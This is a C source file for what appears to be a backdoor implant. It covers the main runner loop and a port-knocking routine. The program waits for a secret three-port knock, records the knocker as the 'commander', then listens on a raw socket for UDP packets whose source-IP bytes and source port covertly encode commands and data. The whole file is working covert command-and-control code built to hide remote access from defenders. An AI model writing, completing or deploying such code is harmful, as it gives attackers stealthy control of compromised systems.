#include "runner.h"
#include "network.h"
#include "commands.h"

#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

int runner(struct Context *ctx) {
    // if command = disconnect, return 1
    // -1 on fatal errors, 0 for uninstall command
    // doesn't return otherwise

    printf("Waiting for knock sequence..\n");
    while (listen_knock(ctx) == 1) {
        printf("Knock was not completed in time after starting\n");
    }
    printf("Knock completed.\n");

    ctx->covert_fd = setup_covert_fd();
    if (ctx->covert_fd < 0) {
        fprintf(stderr, "covert_fd set up error\n");
        return -1;
    }

    uint8_t buffer[BUF_SIZE];
    while (1) {
        ssize_t ret = recv(ctx->covert_fd, buffer, BUF_SIZE, 0);
        if (ret < 0) {
            fprintf(stderr, "recv error\n");
            close(ctx->covert_fd);
            return -1;
        }


        const struct iphdr *ip = (struct iphdr *)buffer;
        if (ip->protocol != IPPROTO_UDP) {
            fprintf(stderr, "packet received is not UDP\n");
            return -1;
        }

        const struct udphdr *udp = (struct udphdr *)(buffer + ip->ihl*4);

        if (ntohs(udp->dest) == COVERT_CHAN) {
            // print_packet_info(buffer);
            char ip_buffer[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip->saddr, ip_buffer, sizeof(ip_buffer));

            uint8_t byte1 = 0;
            uint8_t byte2 = 0;
            uint8_t byte3 = 0;
            uint8_t byte4 = 0;

            decode_ip(ip_buffer, &byte1, &byte2, &byte3, &byte4);
            printf("Packet's seq num: %u\n", ntohs(udp->source));
            if (byte2 == 0) {
                printf("Command received\n");
            } else if (byte2 == 1) {
                printf("Term received\n");
            } else {
                printf("Data received\n");
                printf("Packet secret data: %u %u\n", byte3, byte4);
            }


        }

    }

    return 0;
}

int listen_knock(struct Context *ctx) {
    const int KNOCK_PORTS[KNOCKS] = {COVERT_CHAN, KNOCK2, KNOCK3};

    for (int i = 0; i < KNOCKS; i++) {
        int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (listen_fd < 0) {
            perror("socket");
            return -1;
        }

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(KNOCK_PORTS[i]);

        if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("bind");
            close(listen_fd);
            return -1;
        }

        if (listen(listen_fd, 1) < 0) {
            perror("listen");
            close(listen_fd);
            return -1;
        }

        struct sockaddr_in client;
        socklen_t client_len = sizeof(client);

        if (i > 0) {
            struct timeval tv = {
                .tv_sec = KNOCK_TO, .tv_usec = 0
            };
            if (setsockopt(listen_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
                perror("setsockopt");
                close(listen_fd);
                return -1;
            }
        }

        int conn_fd = accept(listen_fd, (struct sockaddr *)&client, &client_len);
        if (conn_fd < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Timeout reached
                close(listen_fd);
                return 1;
            } else {
                perror("accept");
                close(listen_fd);
                return -1;
            }
        }

        if (KNOCK_PORTS[i] == KNOCK3) {
            inet_ntop(AF_INET, &client.sin_addr, ctx->commander_ip, INET_ADDRSTRLEN);
            printf("Commander ip: %s\n", ctx->commander_ip);
        }

        close(conn_fd);
        close(listen_fd);

    }

    return 0;

}
